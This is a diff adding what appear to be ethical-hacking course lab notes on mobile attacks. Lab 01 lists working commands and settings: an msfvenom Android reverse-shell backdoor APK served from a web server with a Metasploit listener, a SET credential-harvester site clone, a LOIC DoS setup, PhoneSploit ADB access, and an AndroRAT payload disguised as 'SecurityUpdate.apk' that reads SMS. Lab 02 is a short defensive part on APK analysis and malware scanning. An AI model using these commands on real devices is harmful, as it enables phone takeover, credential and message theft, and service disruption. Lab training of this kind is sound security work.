@@ -1,0 +1,104 @@
+--- Lab 01 ---
+
+-- Task 1 - Hacking via Binary Payload using Metasploit --
+
+1. Payload Creation:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.3 LPORT=4444 -o /root/Desktop/Backdoor.apk
+
+2. Web Server Setup:
+mkdir /var/www/html/share
+chmod -R 777 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+scp /root/Desktop/Backdoor.apk /var/www/html/share
+
+3. Metasploit Listener:
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.10.3
+set LPORT 4444
+exploit -j -z
+
+4. Post-Exploitation Commands:
+sysinfo
+cd /sdcard
+ps
+
+-- Task 2 - Social Engineering using SET --
+
+1. Launching SET:
+setoolkit
+
+2. Menu Navigation:
+Social-Engineering Attacks (Option 1)
+Website Attack Vectors (Option 2)
+Credential Harvester Attack Method (Option 3)
+Site Cloner (Option 2)
+
+3. Configuring the Attack:
+IP for POST back: 10.10.1.13
+URL to Clone: http://certifiedhacker.com/Online%20Booking/index.htm
+
+-- Task 3 - Launching a DoS Attack using LOIC --
+
+1. LOIC Setup (GUI-Based):
+Enter target URL/IP: http://10.0.2.15
+Port: 80
+Threads: 100
+Protocol: TCP
+
+2. Monitoring Traffic (Wireshark):
+wireshark
+
+-- Task 4 - Exploiting Android via ADB using PhoneSploit -- 
+
+1. Launching PhoneSploit:
+python3 phonesploitpro.py
+
+2. Connecting to Target Device:
+Enter selection > 1
+Enter target phone's IP Address > 10.10.1.14
+
+3. Key Actions:
+Shell Access (Option 14):
+ls
+cd /sdcard/Download
+
+Screenshot Capture (Option 6)
+List Installed Apps (Option 13)
+Run App Remotely (Option 10):
+com.android.calculator2
+
+-- Task 5 - Hacking via APK using AndroRAT --
+
+1. Payload Generation:
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+
+2. Web Server Setup:
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+service apache2 start
+
+3. Listener Activation:
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+
+4. Post-Exploitation Commands:
+getSMS inbox
+getMACAddress
+deviceInfo
+
+--- Lab 02 ---
+
+-- Task 1 - APK Analysis using SISIK Online APK Analyzer --
+
+Procedure:
+Upload communicationstage.apk to SISIK Online APK Analyzer
+Review output (min SDK, target SDK, permissions)
+
+-- Task 2 - Securing Android with Malwarebytes --
+
+1. Scan Execution (GUI):
+Open Malwarebytes
+Navigate to Scanner → Run Scan
+Review threats (e.g., LOIC_v1.3.apk)
